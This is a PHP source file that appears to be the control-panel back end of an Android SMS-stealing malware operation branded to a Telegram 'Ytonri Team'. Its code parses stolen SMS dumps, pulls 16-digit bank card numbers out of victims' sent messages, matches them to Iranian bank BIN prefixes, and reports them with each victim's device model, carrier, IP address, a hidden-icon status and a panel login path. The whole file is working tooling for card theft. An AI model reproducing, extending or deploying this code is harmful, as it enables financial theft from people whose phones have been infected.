<?php
function processCards($file_path, $model, $operator, $ip, $device_id) {
    if (!file_exists($file_path)) {
        return "🕸 ᴜꜱᴇʀ ɪꜱ ᴏꜰꜰʟɪɴᴇ ᴏʀ ꜱᴍꜱ ɴᴏᴛ ꜰᴏᴜɴᴅ\n\n" . generateUserInfo($model, $operator, $ip, $device_id);
    }
    
    $content = file_get_contents($file_path);
    
    // ᴀʟɢᴏ ʙᴀʀᴀʏ ʏᴀꜰᴛᴀɴ ʜᴀᴍᴇ ʙʟᴏᴋ‌ʜᴀʏ ᴘɪᴀᴍ
    preg_match_all('/\|-----@YtonriIR-----\|(.*?)\|-----@YtonriIR-----\|/s', $content, $message_blocks);
    
    $cards = [];
    foreach ($message_blocks[1] as $block) {
        // ʙʀᴀꜱꜱɪ ᴀʏɴᴋᴇʜ ᴀʏᴀ ᴘɪᴀᴍ ᴀᴢ ɴᴏᴠ ꜱᴇɴᴛ ᴀꜱᴛ
        if (preg_match('/ᴛʏᴘᴇ : ꜱᴇɴᴛ/s', $block)) {
            // ᴀꜱᴛᴇxʀᴀᴊ ᴍᴀʜᴛᴀᴠᴀʏ ᴛᴇxᴛ
            if (preg_match('/ᴛᴇxᴛ :(.*?)(?=\||$)/s', $block, $text_match)) {
                $text_content = trim($text_match[1]);
                
                // ᴊꜱᴛᴊᴜʏ ꜱʜᴏᴍᴀʀᴇʜ ᴋᴀʀᴅ ᴅʀ ᴍᴀʜᴛᴀᴠᴀʏ ᴛᴇxᴛ
                preg_match_all('/(?:\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}|\b\d{16}\b)/', $text_content, $card_matches);
                
                foreach ($card_matches[0] as $card) {
                    $clean = preg_replace('/[^0-9]/', '', $card);
                    if (strlen($clean) === 16 && ctype_digit($clean)) {
                        $cards[] = $clean;
                    }
                }
            }
        }
    }
    
    if (empty($cards)) {
        return "🕸 ɴᴏ ʙᴀɴᴋ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜱᴇɴᴛ ᴍᴇꜱꜱᴀɢᴇꜱ\n\n" . generateUserInfo($model, $operator, $ip, $device_id);
    }
    
    $cards = array_unique($cards);
    $result = "🦠 ᴇxᴛʀᴀᴄᴛᴇᴅ ᴄᴀʀᴅꜱ (ꜰʀᴏᴍ ꜱᴇɴᴛ ᴍᴇꜱꜱᴀɢᴇꜱ):\n\n";
    foreach ($cards as $card) {
        $bank_info = getBankInfo(substr($card, 0, 6));
        $result .= "• <code>" . $card . "</code>\n";
        $result .= "☠️ " . $bank_info[0] . " " . $bank_info[1] . "\n\n";
    }
    $result .= generateUserInfo($model, $operator, $ip, $device_id);
    return $result;
}

function generateUserInfo($model, $operator, $ip, $device_id) {
    return "┌🩸 ᴍᴏᴅᴇʟ: $model\n"
         . "├👁️ ꜱᴛᴀᴛᴜꜱ: ɪᴄᴏɴ: ʜɪᴅᴅᴇɴ - ꜱᴄʀᴇᴇɴ: ᴏɴ\n"
         . "├🦇 ᴏᴘᴇʀᴀᴛᴏʀ: $operator\n"
         . "├🐦‍⬛ ɪᴘ: $ip\n"
         . "└🕸 ᴘᴀɴᴇʟ: /login_$device_id\n\n"
         . "🕸 | <a href='https://t.me/YtonriTeam'>[ʏᴛᴏɴʀɪ] -ᴛᴇᴀᴍ</a>";
}

function getBankInfo($bin) {
    $banks = [
        '603799' => ['ᴍᴇʟʟɪ', '#Melli'],
        '589210' => ['ꜱᴇᴘᴀʜ', '#Sepah'],
        '627648' => ['ꜱᴀᴅᴇʀᴀᴛ', '#Saderat'],
        '627961' => ['ꜱᴀɴᴀᴛᴍᴀᴅᴀɴ', '#SanatMadan'],
        '603770' => ['ᴋᴇꜱʜᴀᴠᴀʀᴢɪ', '#Keshavarzi'],
        '628023' => ['ᴍᴀꜱᴋᴀɴ', '#Maskan'],
        '627760' => ['ᴘᴏꜱᴛʙᴀɴᴋ', '#PostBank'],
        '502908' => ['ᴛᴀᴀᴠᴏɴ', '#Taavon'],
        '627412' => ['ᴇɢʜᴛᴇꜱᴀᴅɴᴏᴠɪɴ', '#EghtesadNovin'],
        '622106' => ['ᴘᴀʀꜱɪᴀɴ', '#Parsian'],
        '502229' => ['ᴘᴀꜱᴀʀɢᴀᴅ', '#Pasargad'],
        '639347' => ['ꜱɪɴᴀ', '#Sina'],
        '636214' => ['ᴀʏᴀɴᴅᴇʜ', '#Ayandeh'],
        '505416' => ['ɢᴀʀᴅᴇꜱʜɢᴀʀɪ', '#Gardeshgari'],
        '606256' => ['ᴍᴇʟʟᴀᴛ', '#Mellat'],
        '621986' => ['ꜱᴀᴍᴀɴ', '#Saman'],
        '603769' => ['ꜱᴀᴅᴇʀᴀᴛ', '#Saderat'],
        '610433' => ['ᴍᴇʟʟᴀᴛ', '#Mellat'],
        '627353' => ['ᴛᴇᴊᴀʀᴀᴛ', '#Tejarat'],
        '585983' => ['ᴛᴇᴊᴀʀᴀᴛ', '#Tejarat'],
        '589463' => ['ʀᴇꜰᴀʜ', '#Refah'],
        '505801' => ['ᴋᴏꜱᴀʀ', '#Kosar'],
        '639599' => ['ɢʜᴀᴠᴀᴍɪɴ', '#Ghavamin'],
        '636949' => ['ʜᴇᴋᴍᴀᴛ', '#Hekmat'],
        '627488' => ['ᴋᴀʀᴀꜰᴀʀɪɴ', '#KarAfarin']
    ];
    return $banks[$bin] ?? ['ᴜɴᴋɴᴏᴡɴ', '#Unknown'];
}